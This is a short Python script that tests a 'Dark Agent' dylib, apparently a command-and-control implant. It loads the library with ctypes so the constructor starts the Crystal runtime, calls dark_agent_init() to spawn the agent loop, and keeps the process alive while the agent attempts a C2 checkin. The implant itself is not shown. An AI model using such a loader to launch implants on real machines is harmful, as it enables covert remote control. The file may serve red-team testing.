#!/usr/bin/env python3
"""
Test loader for Dark Agent dylib.

Loads the dylib via ctypes (dlopen under the hood), which triggers:
  1. __attribute__((constructor)) in crystal_dylib_init.c → Crystal runtime bootstrap
  2. Explicit call to dark_agent_init() → spawns agent loop on a fiber

Usage:
    python3 test_dylib.py ./dark-agent-test.dylib
"""

import ctypes
import sys
import time
import signal


def signal_handler(sig, frame):
    print("\n[*] Caught SIGINT, exiting...")
    sys.exit(0)


def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <path-to-dylib>")
        sys.exit(1)

    dylib_path = sys.argv[1]
    signal.signal(signal.SIGINT, signal_handler)

    print(f"[*] Loading dylib: {dylib_path}")
    print(f"[*] dlopen will trigger Crystal runtime constructor...")

    try:
        lib = ctypes.cdll.LoadLibrary(dylib_path)
    except OSError as e:
        print(f"[!] Failed to load dylib: {e}")
        sys.exit(1)

    print(f"[+] Dylib loaded successfully — Crystal runtime should be initialized")

    # Verify the exported symbol exists
    try:
        init_func = lib.dark_agent_init
        init_func.restype = ctypes.c_int32
        init_func.argtypes = []
    except AttributeError:
        print("[!] dark_agent_init symbol not found in dylib!")
        print("[!] Check that the dylib was built from dark-agent-dylib.cr")
        sys.exit(1)

    print(f"[*] Found dark_agent_init symbol, calling...")
    result = init_func()
    print(f"[+] dark_agent_init() returned: {result}")

    if result == 0:
        print(f"[+] Agent loop spawned on Crystal fiber")
        print(f"[*] Keeping process alive — Ctrl+C to exit")
        print(f"[*] Agent should be attempting C2 checkin...")

        # Keep the process alive so the spawned fiber can run
        while True:
            time.sleep(1)
    else:
        print(f"[!] dark_agent_init returned non-zero: {result}")
        sys.exit(1)


if __name__ == "__main__":
    main()
